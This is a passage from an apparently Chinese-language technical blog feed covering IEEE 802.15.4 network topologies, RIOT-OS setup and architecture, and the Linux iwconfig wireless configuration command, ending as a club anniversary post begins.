<p>　　网络设备按照一套规定的步骤加入到对等网络：首先，具有路由功能的设备通过发现邻近 PAN 协调器或者作为 PAN 协调器代理来扫描可用的网络。IEEE 802.15.4 标准将具有路由功能的设备也认为是协调器。扫描完成后，网络设备的高层通过向 PAN 协调器或者最近的一个协调器发送入网请求来加入到一个被发现的网络。相应的，协调器决定是否允许网络设备入网。</p>
<p>　　如果这个网络设备是 FFD，它加入网络后也可以成为一个协调器，并向其他已入网设备提供报文转发服务或者向未入网设备提供入网服务。</p>
<p>（2）特点</p>
<ul>
<li>任何两个设备之间都可以通讯。</li>
<li>网络协调器负责管理链路状态信息、认证设备身份等功能。</li>
<li>允许多跳路由的方式传输数据。</li>
<li>适合于设备分布范围广的应用（工业检测与控制）。</li>
</ul>
<h5 id="簇树网络"><a href="#簇树网络" class="headerlink" title="簇树网络"></a>簇树网络</h5><p>　　簇树网络是对等网络拓扑结构的一种特定类型。在对等网络中的设备可以为完整功能设备，也可以为简化功能设备。 而在树簇中的大部分设备是 FFD， RFD 只能作为一个叶结点连接在树簇拓扑结构树枝的末尾处。任何一个 FFD 都可以作为主协调器，并且，为其它从设备或主设备提供同步服务。在整个 PAN 中，只要该设备相对于 PAN 中的其它设备具有更丰富的计算资源，这样的设备都可以成为该 PAN 的主协调器。</p>
<p>　　在建立一个 PAN 时，首先， PAN 主协调器将自身设置为一个簇标识符（ CID）为 0 的簇头，然后，选择一个没有使用的 PAN 标识符，并向邻近的其它设备以广播的方式发送信标帧，从而形成第一簇网络。接收到信标帧的候选设备可以在簇头中请求加入该网络，如果 PAN 主协调器允许该设备加入，那么主协调器会将该设备作为结点加入到邻近表中，成为该网络的一个从设备，同时，请求加入的设备将 PAN 协调器作为它的父结点加到邻近列表中，成为该网络的一个从设备，开始发送周期性的信标帧；其它的候选设备也可以在这台刚加入的设备上加入该网络。如果原始的候选不能加入到该网络中，那么它将寻找其它的父结点。</p>
<p>　　参考文献：</p>
<p>[1] Gutierrez J A, Callaway E H, Barrett R L. Low-rate wireless personal area networks: enabling wireless sensors with IEEE 802.15. 4[M]. IEEE Standards Association, 2004.</p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>IEEE 802.15.4</tag>
      </tags>
  </entry>
  <entry>
    <title>RIOT-OS 开发环境搭建与样例解析</title>
    <url>/2017/11/24/RIOT-OS%20%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E6%A0%B7%E4%BE%8B%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<p>　　正式开始折腾友好的 RIOT 操作系统。</p>
<a id="more"></a>
<h4 id="开发环境搭建"><a href="#开发环境搭建" class="headerlink" title="开发环境搭建"></a>开发环境搭建</h4><h5 id="源码下载与编译"><a href="#源码下载与编译" class="headerlink" title="源码下载与编译"></a>源码下载与编译</h5><p>　　以 Ubuntu 系统中搭建 RIOT-OS 开发环境为例，下载源码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> git://github.com/RIOT-OS/RIOT.git</span></div></pre></td></tr></table></figure>
<p>　　主分支一般是稳定版，如需最新版可切换到最新的分支：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> RIOT</span></div><div class="line"><span class="meta">$</span><span class="bash"> checkout &lt;LATEST_RELEASE&gt;</span></div></pre></td></tr></table></figure>
<p>　　编译：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo ./dist/tools/tapsetup/tapsetup  <span class="comment"># 创建虚拟以太网接口，连接多个RIOT实例        </span></span></div><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> examples/default/</span></div><div class="line"><span class="meta">$</span><span class="bash"> make all</span></div><div class="line"><span class="meta">$</span><span class="bash"> make term</span></div></pre></td></tr></table></figure>
<p>　　亲测，32 位 Ubuntu 系统可以正确执行编译，但是 64 位 Ubuntu 在使用 make all 编译时会出错，如图：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/6/13-1.png" alt="13-1"></p>
<p>　　可使用如下方法解决：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install libc6-dev-i386</span></div></pre></td></tr></table></figure>
<p>　　完成后再编译即可。使用 make term 进行本地调试时，也会出错，如图：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/6/13-2.png" alt="13-2"></p>
<p>　　此时需加上 sudo 提升下权限：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo make term</span></div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/6/13-3.png" alt="13-3"></p>
<p>　　如果要编译到指定的平台，可在 make 时使用 BOARD 指定，例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo make BOARD=cc2538dk</span></div></pre></td></tr></table></figure>
<p>　　然后，使用 make 进行编译，会发现如下错误。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/6/13-4.png" alt="13-4"></p>
<p>　　编译到 cc2538dk 等平台时需要下载交叉编译工具，否则会报错。根据 RIOT 的官方文档：</p>
<p><a href="https://github.com/RIOT-OS/RIOT/wiki/Family%3A-ARM" target="_blank" rel="external">https://github.com/RIOT-OS/RIOT/wiki/Family%3A-ARM</a></p>
<p>　　ARM 系列需要下载 gcc-arm-embedded toolchain，地址如下：<a href="https://developer.arm.com/open-source/gnu-toolchain/gnu-rm" target="_blank" rel="external">https://developer.arm.com/open-source/gnu-toolchain/gnu-rm</a></p>
<p>　　下载 Linux64 位版本，然后将其解压：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> tar -xjvf 下载工具包名称.tar.bz2 -C /usr/bin</span></div></pre></td></tr></table></figure>
<p>　　将其添加到环境变量：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> nano ~/.bashrc</span></div></pre></td></tr></table></figure>
<p>　　在最后添加如下一行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">export</span> PATH=/usr/bin/下载工具包名称/bin:<span class="variable">$PATH</span></span></div></pre></td></tr></table></figure>
<p>　　然后执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">source</span> ~/.bashrc</span></div></pre></td></tr></table></figure>
<p>　　这样即可执行编译。但是注意编译一定不要使用 sudo，这样的话还是会出错，直接 make 就好了：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> make BOARD=cc2538dk</span></div></pre></td></tr></table></figure>
<h5 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h5><p>　　以 cc2538dk 硬件平台为例：</p>
<ul>
<li>编译生成指定硬件平台的可执行文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> make BOARD=cc2538dk</span></div><div class="line">or</div><div class="line"><span class="meta">$</span><span class="bash"> make all BOARD=cc2538dk</span></div></pre></td></tr></table></figure>
<ul>
<li>将程序烧录到指定硬件平台</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> make flash BOARD=cc2538dk</span></div></pre></td></tr></table></figure>
<ul>
<li>通过串口连接到硬件平台进行调试</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> make term BOARD=cc2538dk</span></div><div class="line">or</div><div class="line"><span class="meta">$</span><span class="bash"> make term BOARD=cc2538dk PORT=/dev/ttyACM1</span></div></pre></td></tr></table></figure>
<h4 id="例程解析"><a href="#例程解析" class="headerlink" title="例程解析"></a>例程解析</h4><h5 id="main-c"><a href="#main-c" class="headerlink" title="main.c"></a>main.c</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"shell.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"shell_commands.h"</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Hello World!"</span>);</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"You are running RIOT on a(n) %s board.\n"</span>, RIOT_BOARD);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"This board features a(n) %s MCU.\n"</span>, RIOT_MCU);</div><div class="line"></div><div class="line">    <span class="keyword">char</span> line_buf[SHELL_DEFAULT_BUFSIZE];</div><div class="line">    shell_run(<span class="literal">NULL</span>, line_buf, SHELL_DEFAULT_BUFSIZE);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　代码风格与我们平时使用的 C 基本没有区别，节点启动后，RIOT 会启动两个线程：</p>
<ul>
<li>idle 线程，具有最低优先级，只要没有其他线程准备运行，它将运行。它将自动使用设备的最低可能的电源模式。</li>
<li>main 线程，配置的默认优先级位于最低和最高可用优先级之间的中间-是运行并调用 main() 函数的第一个线程。</li>
</ul>
<p>　　另外，它这里使用到了 RIOT 的 shell，程序运行后可通过shell命令与程序进行交互，当然，我们这里并没有定义命令，所以如下图的运行结果中并没有命令。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/6/13-5.png" alt="13-5"></p>
<h5 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h5><p>　　应用程序的 Makefile 至少需要定义以下宏：</p>
<ul>
<li>APPLICATION：应该包含应用程序的名称</li>
<li>RIOTBASE：指定 RIOT 存储库副本的路径</li>
</ul>
<p>　　BOARD 宏也是需要的并且默认被建议设置为 native，但是建议使用？=操作符来覆盖。另外，需要从 RIOTBASE 中包含 Makefile.include。</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><div class="line"><span class="comment"># 应用程序的名称</span></div><div class="line">APPLICATION = hello-world</div><div class="line"></div><div class="line"><span class="comment"># 定义开发板，默认是native平台，可在bashrc文件中添加，也可以在编译之前使用export BOARD=cc2538cb定义</span></div><div class="line">BOARD ?= native</div><div class="line"></div><div class="line"><span class="comment"># 指定根路径，用于加载模块、驱动等，这必须是RIOT基本目录的绝对路径</span></div><div class="line">RIOTBASE ?= <span class="variable">$(CURDIR)</span>/../../RIOT</div><div class="line"><span class="keyword">include</span> <span class="variable">$(RIOTBASE)</span>/Makefile.<span class="keyword">include</span></div><div class="line"></div><div class="line"><span class="comment"># 添加模块</span></div><div class="line">USEMODULE += shell</div><div class="line">USEMODULE += shell_commands</div></pre></td></tr></table></figure>
<p>　　包含模块：</p>
<p>　　默认情况下，RIOT 应用程序仅包含应用程序的代码本身，内核和平台特定的代码。为了使用其他模块，如特定的设备驱动程序或系统库（包括网络功能），你必须将模块的名称附加到 USEMODULE 变量。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">USEMODULE += sht11</div><div class="line">USEMODULE += gnrc_ipv6_default</div><div class="line">USEMODULE += gnrc_udp</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>IoT</category>
        <category>OS</category>
      </categories>
      <tags>
        <tag>RIOT</tag>
      </tags>
  </entry>
  <entry>
    <title>开源物联网操作系统：RIOT-OS</title>
    <url>/2017/11/18/%E5%BC%80%E6%BA%90%E7%89%A9%E8%81%94%E7%BD%91%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%9ARIOT-OS/</url>
    <content><![CDATA[<p>　　RIOT 是一个开源的物联网操作系统，它针对物联网场景的低功耗、资源受限等特殊要求而设计，前景很不错。</p>
<a id="more"></a>
<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/11/18-1.png" alt="18-1"></p>
<p>　　RIOT 操作系统针对物联网场景的特殊要求而设计。这些要求包括低内存占用，高能效，实时功能，模块化和可配置的通信堆栈，并支持各种低功耗设备。</p>
<p>　　RIOT 基于微内核架构，这意味着它针对非常低的资源需求进行了优化，并且支持实时和多线程处理。它兼容 16/32 位 MCU 架构，还有一个本机端口可用于在 Linux 或 MacOS 上作为进程运行，从而可以使用标准开发工具，如 GNU 编译器集合，GNU 调试器，Valgrind 或 Wireshark 。</p>
<p>　　RIOT 具有多种功能集成，支持 C/C++ 语言，并提供 shell，加密库，各种数据结构等功能。操作系统集成了对 IPv6 或 6LoWPAN 等网络堆栈的支持，以及 UDP，TCP，RPL 和 CoAP 网络协议。操作系统还具有各种硬件的驱动程序，如传感器，无线电收发器和 MCU。</p>
<h5 id="支持的平台"><a href="#支持的平台" class="headerlink" title="支持的平台"></a>支持的平台</h5><p>　　RIOT 支持 ARM Cortex-M0，M3，M4 和 ARM7 架构，从而支持各种开发板，如 Arduino Due，基于 Atmel ATmega2560 MCU（例如Arduino Mega 2560）或蓝牙设备如北欧 nRF51822 SoC。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/11/18-3.png" alt="18-3"></p>
<h5 id="支持的网络协议栈"><a href="#支持的网络协议栈" class="headerlink" title="支持的网络协议栈"></a>支持的网络协议栈</h5><p>　　RIOT 不仅仅支持 TCP/IP 网络协议栈，还支持 IPv6，6lowpan 等，另外，它还通过 CCN Lite 提供了对 CCN 协议的支持。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/11/18-2.png" alt="18-2"></p>
<h5 id="操作系统对比"><a href="#操作系统对比" class="headerlink" title="操作系统对比"></a>操作系统对比</h5><p>　　对比 TinyOS、Contiki、Linux，RIOT 的优势十分明显。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/11/18-3.png" alt="18-4"></p>
<h4 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h4><p>RIOT-OS官网：<a href="http://www.riot-os.org/" target="_blank" rel="external">http://www.riot-os.org/</a></p>
<p>Github repository: <a href="https://github.com/RIOT-OS/RIOT" target="_blank" rel="external">https://github.com/RIOT-OS/RIOT</a></p>
<p>CSDN博客： <a href="http://blog.csdn.net/mx1252111/article/category/6423778" target="_blank" rel="external">http://blog.csdn.net/mx1252111/article/category/6423778</a></p>
<p>论文1：Will H, Schleiser K, Schiller J. A real-time kernel for wireless sensor networks employed in rescue scenarios[C]// Local Computer Networks, 2009. LCN 2009. IEEE, Conference on. IEEE, 2009:834-841. <a href="http://ieeexplore.ieee.org/document/5355049/" target="_blank" rel="external">http://ieeexplore.ieee.org/document/5355049/</a></p>
<p>论文2：Baccelli E, Hahm O, Wählisch M, et al. RIOT: One OS to Rule Them All in the IoT[J]. HAL - INRIA, 2013. <a href="https://hal.inria.fr/hal-00768685/" target="_blank" rel="external">https://hal.inria.fr/hal-00768685/</a></p>
<p>论文3：Baccelli E, Hahm O, GüNes M, et al. RIOT OS: Towards an OS for the Internet of Things[C]// Computer Communications Workshops. IEEE, 2013:79-80. <a href="http://www.riot-os.org/docs/riot-infocom2013-abstract.pdf" target="_blank" rel="external">http://www.riot-os.org/docs/riot-infocom2013-abstract.pdf</a></p>
<h4 id="系统框架"><a href="#系统框架" class="headerlink" title="系统框架"></a>系统框架</h4><p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/11/18-5.png" alt="18-5"></p>
<p>　　RIOT 的代码库分为五组。</p>
<ul>
<li>内核 (core)</li>
<li>平台特定的代码 (cpu; boards)</li>
<li>设备驱动 (drivers)</li>
<li>库和网络代码 (sys; pkg)</li>
<li>演示功能和测试的应用程序 (examples; tests)</li>
</ul>
<p>　　此外，RIOT 还包括各种任务的脚本集合(dist)以及用于生成文档(soc)的预定义环境。</p>
<h5 id="core"><a href="#core" class="headerlink" title="core"></a>core</h5><p>　　core 文件夹包含了 RIOT 的内核文件，包括线程管理，消息管理，关键数据结构，一些格式定义等。其中最关键的是，它包含了 RIOT 中主线程和空闲线程的创建。</p>
<h5 id="board"><a href="#board" class="headerlink" title="board"></a>board</h5><p>　　board 文件夹中包含了 RIOT 支持的硬件平台的所有定义和实现，其中包括 ARM、TI 等公司的产品。通常，硬件平台由控制器的固定配置和一些外部设备（如传感器或无线电）组成。该文件夹的主要作用是把硬件平台编译需要的文件联系起来，这样硬件平台才能够编译，它包含有关 GPIO 引脚，MCU 时钟和器件驱动程序配置的所有方面。</p>
<h5 id="cpu"><a href="#cpu" class="headerlink" title="cpu"></a>cpu</h5><p>　　cpu 文件夹包含所有特定于 CPU 的源文件。在多个 CPU 共享相同架构的情况下，实现被分为几个 CPU 特定的部分和架构部分（例如 arm7_common 和 lpc2387）。cpu 这个文件夹非常重要，前期的编程会频繁的使用到这个文件夹内的文件。</p>
<h5 id="drivers"><a href="#drivers" class="headerlink" title="drivers"></a>drivers</h5><p>　　drivers 文件夹包含特定设备的所有类型的驱动程序，比如 enc28j60，dht11 等，同时它还包含了硬件平台底层驱动的头文件。</p>
<h5 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h5><p>　　sys 是一个非常重要的文件夹，里面包含了 RIOT 的精华部分，我们就很少去直接使用 cpu 文件夹的内容，而是直接使用 sys 中的一些函数，因为 cpu 文件夹中的东西是底层的，而 sys 中的应用是高层的。</p>
<p>　　而sys文件夹下的 net 文件夹更是重中之重，这里面包含了 RIOT 网络部分的文件，其中包括数据链路层、网络层、传输层和应用层的。因此，我们可以找到 sixlowpan，udp，rpl，border routers 等功能。RIOT 提供了强大的 gnrc 模块，在无线传输方面十分方便。</p>
<h5 id="examples"><a href="#examples" class="headerlink" title="examples"></a>examples</h5><p>　　examples 文件夹里面提供了几个经典的例程，这几个例程非常非常的重要，可以说只要掌握了这几个例程的功能，RIOT 的大部分功能就学会了。只要明白了 shell 命令去调试之后就可以很简单的去解析这些程序了。</p>
<h5 id="tests"><a href="#tests" class="headerlink" title="tests"></a>tests</h5><p>　　tests 文件夹提供了各个功能的详细测试程序。RIOT 里面包含的功能几乎都可以在这里面找到测试的实例。而且这些功能机会支持所有的硬件平台。只要按照自己选择的硬件平台去编译就能根据测试结果去辅助学习了。</p>
<h5 id="pkg"><a href="#pkg" class="headerlink" title="pkg"></a>pkg</h5><p>　　pkg 文件夹提供了一些外部库驱动，比如 libcoap、openwsn 等库驱动。</p>
<h5 id="dist、doc"><a href="#dist、doc" class="headerlink" title="dist、doc"></a>dist、doc</h5><p>　　dist 文件夹提供了一些工具，doc 文件夹提供了一些文档。</p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>OS</category>
      </categories>
      <tags>
        <tag>RIOT</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Wireless Tools：iwconfig</title>
    <url>/2017/11/11/Linux%20Wireless%20Tools%EF%BC%9Aiwconfig/</url>
    <content><![CDATA[<p>　　iwconfig - 配置无线网络接口</p>
<a id="more"></a>
<p>　　iwconfig 用于 Linux 系统配置无线网络设备或显示无线网络设备信息。iwconfig 命令类似于 ifconfig 命令，但是他配置对象是无线网卡，它对网络设备进行无线操作，如设置无线通信频段。</p>
<h4 id="iwconfig-安装"><a href="#iwconfig-安装" class="headerlink" title="iwconfig 安装"></a>iwconfig 安装</h4><p>　　Ubuntu 下使用如下命令安装，wireless-tools 工具包中包含了 iwconfig。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> sudo apt install wireless-tools</div></pre></td></tr></table></figure>
<h4 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h4><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Usage: iwconfig [interface]</div><div class="line">                interface essid &#123;NNN|any|on|off&#125;</div><div class="line">                interface mode &#123;managed|ad-hoc|master|...&#125;</div><div class="line">                interface freq N.NNN[k|M|G]</div><div class="line">                interface channel N</div><div class="line">                interface bit &#123;N[k|M|G]|auto|fixed&#125;</div><div class="line">                interface rate &#123;N[k|M|G]|auto|fixed&#125;</div><div class="line">                interface enc &#123;NNNN-NNNN|off&#125;</div><div class="line">                interface key &#123;NNNN-NNNN|off&#125;</div><div class="line">                interface power &#123;period N|timeout N|saving N|off&#125;</div><div class="line">                interface nickname NNN</div><div class="line">                interface nwid &#123;NN|on|off&#125;</div><div class="line">                interface ap &#123;N|off|auto&#125;</div><div class="line">                interface txpower &#123;NmW|NdBm|off|auto&#125;</div><div class="line">                interface sens N</div><div class="line">                interface retry &#123;limit N|lifetime N&#125;</div><div class="line">                interface rts &#123;N|auto|fixed|off&#125;</div><div class="line">                interface frag &#123;N|auto|fixed|off&#125;</div><div class="line">                interface modulation &#123;11g|11a|CCK|OFDMg|...&#125;</div><div class="line">                interface commit</div><div class="line">       Check man pages for more details.</div></pre></td></tr></table></figure>
<h5 id="essid"><a href="#essid" class="headerlink" title="essid"></a>essid</h5><p>　　设置无线网卡的 ESSID(Extension Service Set ID)。通过 ESSID 来区分不同的无线网络，正常情况下只有相同 ESSID 的无线站点才可以互相通讯，除非想监听无线网络。其后的参数为双引号括起的 ESSID 字符串，或者是any/on/off，如果 ESSID字符串中包含any/no/off，则需要在前面加”–”。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> iwconfig eth0 essid any</div><div class="line"><span class="meta">$</span> iwconfig eth0 essid "My Network""</div><div class="line"><span class="meta">$</span> iwconfig eth0 essid -- "ANY""</div></pre></td></tr></table></figure>
<h5 id="mode"><a href="#mode" class="headerlink" title="mode"></a>mode</h5><p>　　设置无线网卡的工作模式，可以是</p>
<ul>
<li>Ad-hoc：不带 AP 的点对点无线网络</li>
<li>Managed：通过多个 AP 组成的网络，无线设备可以在这个网络中漫游</li>
<li>Master：设置该无线网卡为一个 AP</li>
<li>Repeater：设置为无线网络中继设备，可以转发网络包</li>
<li>Secondary：设置为备份的 AP/Repeater</li>
<li>Monitor：监听模式</li>
<li>Auto：由无线网卡自动选择工作模式</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> iwconfig wlan0 mode Managed</div><div class="line"><span class="meta">$</span> iwconfig wlan0 mode Ad-Hoc</div></pre></td></tr></table></figure>
<h5 id="freq-channel"><a href="#freq-channel" class="headerlink" title="freq/channel"></a>freq/channel</h5><p>　　设置无线网卡的工作频率或者频道，小于 1000 的参数被认为是频道，大于 10000 的参数被认为是频率。频率单位为 Hz，可以在数字后面附带 k, M, G 来改变数量级，比如 2.4G。频道从1开始。使用 lwlist 工具可以查看无线网卡支持的频率和频道。参数 off/auto 指示无线网络自动挑选频率。</p>
<p>　　注意：如果是 Managed 模式，AP 会指示无线网卡的工作频率，因此该设置的参数会被忽略。Ad-hoc 模式下只使用该设定的频率初始无线网络，如果加入已经存在的 Ad-hoc 网络则会忽略该设置的频率参数。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> iwconfig wlan0 freq 2422000000</div><div class="line"><span class="meta">$</span> iwconfig wlan0 freq 2.422G</div><div class="line"><span class="meta">$</span> iwconfig wlan0 channel 3</div><div class="line"><span class="meta">$</span> iwconfig wlan0 channel auto</div></pre></td></tr></table></figure>
<h5 id="rate-bit"><a href="#rate-bit" class="headerlink" title="rate/bit"></a>rate/bit</h5><p>　　如果无线网卡支持多速率，则可以通过该命令设置工作的速率。小于 1000 的参数由具体的无线网卡驱动定义，一般是传输速率的索引值，大于 1000 的为速率，单位 bps，可以在数字后面附带 k，M，G 来指定数量级。auto 参数让无线网卡自动选择速率 fixed 参数让无线网卡不使用自动速率模式。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> iwconfig wlan0 rate 11M</div><div class="line"><span class="meta">$</span> iwconfig wlan0 rate auto</div><div class="line"><span class="meta">$</span> iwconfig wlan0 rate 5.5M auto</div></pre></td></tr></table></figure>
<h5 id="ap"><a href="#ap" class="headerlink" title="ap"></a>ap</h5><p>　　连接到指定的 AP 或者无线网络，后面的参数可以是 AP 的 MAC 地址，也可以是 iwlist scan 出来的标识符。如果是 Ad-hoc，则连接一个已经存在的 Ad-hoc 网络。使用 off 参数让无线网卡不改变当前已连接的 AP 下进入自动模式。any/auto 参数，无线网卡自动选择最好的 AP。</p>
<p>　　注意：如果无线信号低到一定程度，无线网络会进入自动选择AP模式。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> iwconfig wlan0 ap 00:60:1D:01:23:45</div><div class="line"><span class="meta">$</span> iwconfig wlan0 ap any</div><div class="line"><span class="meta">$</span> iwconfig wlan0 ap off</div></pre></td></tr></table></figure>
<h5 id="key-enc"><a href="#key-enc" class="headerlink" title="key/enc"></a>key/enc</h5><p>　　设置无线网卡使用的加密密钥，此处为设置 WEP 模式的加密 key，如果要使用 WPA，需要 wpa_supplicant 工具包。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> iwconfig wlan0 key 0123-4567-89</div><div class="line"><span class="meta">$</span> iwconfig wlan0 key [3] 0123-4567-89</div><div class="line"><span class="meta">$</span> iwconfig wlan0 key s:password [2]</div></pre></td></tr></table></figure>
<h5 id="power"><a href="#power" class="headerlink" title="power"></a>power</h5><p>　　设置无线网卡的电源管理模式。period ‘value’  指定唤醒的周期，timeout ‘value’ 指定进入休眠的等待时间，这两个参数之前可以加 min 和 max 修饰，这些值的单位为秒，可以附加 m 和 u 来指定毫秒和微秒。off/on 参数指定是否允许电源管理，all/unicast/multicast 指定允许唤醒的数据包类型。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> iwconfig wlan0 power period 2</div><div class="line"><span class="meta">$</span> iwconfig wlan0 power 500m unicast</div><div class="line"><span class="meta">$</span> iwconfig wlan0 power timeout 300u all</div><div class="line"><span class="meta">$</span> iwconfig wlan0 power saving 3</div><div class="line"><span class="meta">$</span> iwconfig wlan0 power off</div><div class="line"><span class="meta">$</span> iwconfig wlan0 power min period 2 power max period 4</div></pre></td></tr></table></figure>
<h5 id="txpower"><a href="#txpower" class="headerlink" title="txpower"></a>txpower</h5><p>　　如果无线网卡支持多发射功率设定，则使用该参数设定发射，单位为 dBm，如果指定为 W（毫瓦），只转换公式为：<br>dBm=30+log(W)。参数 on/off 可以打开和关闭发射单元，auto 和 fixed 指定无线是否自动选择发射功率。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> iwconfig wlan0 txpower 15</div><div class="line"><span class="meta">$</span> iwconfig wlan0 txpower 30mW</div><div class="line"><span class="meta">$</span> iwconfig wlan0 txpower auto</div><div class="line"><span class="meta">$</span> iwconfig wlan0 txpower off</div></pre></td></tr></table></figure>
<h5 id="retry"><a href="#retry" class="headerlink" title="retry"></a>retry</h5><p>　　设置无线网卡的重传机制。limit ‘value’  指定最大重传次数；lifetime ‘value’ 指定最长重试时间，单位为秒，可以附带 m 和 u 来指定单位为毫秒和微秒。如果无线网卡支持自动模式，则在 limit 和 lifetime 之前还可以附加 min 和 max 来指定上下限值。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> iwconfig wlan0 retry 16</div><div class="line"><span class="meta">$</span> iwconfig wlan0 retry lifetime 300m</div><div class="line"><span class="meta">$</span> iwconfig wlan0 retry short 12</div><div class="line"><span class="meta">$</span> iwconfig wlan0 retry min limit 8</div></pre></td></tr></table></figure>
<h5 id="commit"><a href="#commit" class="headerlink" title="commit"></a>commit</h5><p>　　提交所有的参数修改给无线网卡驱动。有些无线网卡驱动会先缓存无线网卡参数修，使用这个命令来让无线网卡的参数修改生效。不过一般不需要使用该命令，因为无线网卡驱动最终都会是参数的修改生效，一般在 debug 时会用到。</p>
<h5 id="其他配置"><a href="#其他配置" class="headerlink" title="其他配置"></a>其他配置</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">- nwid: Network ID  # 只用于pre-802.11的无线网卡，802.11网卡利用ESSID和AP的MAC地址来替换nwid，现在基本上不用设置。</div><div class="line">- nick: Nickname  # 一些网卡需要设置该参数，但是802.11协议栈、MAC都没有用到该参数，一般也不用设置。</div><div class="line">- sens # 设置接收灵敏度的下限，在该下限之下，无线网卡认为该无线网络信号太差。</div><div class="line">- rts   # 设置节点发送RTS的最小包的大小</div><div class="line">- frag  # 设置发送数据包的分片大小。</div><div class="line">- modu  # 设定的特定调制集</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>iwconfig</tag>
      </tags>
  </entry>
  <entry>
    <title>电协三周年分享</title>
    <url>/2017/11/11/%E7%94%B5%E5%8D%8F%E4%B8%89%E5%91%A8%E5%B9%B4%E5%88%86%E4%BA%AB/</url>
    <content><![CDATA[<p>　　电子协会三周年系列专访，我的一些感想与思考，谨以此纪念电协三周年！</p>
<a id="more"></a>
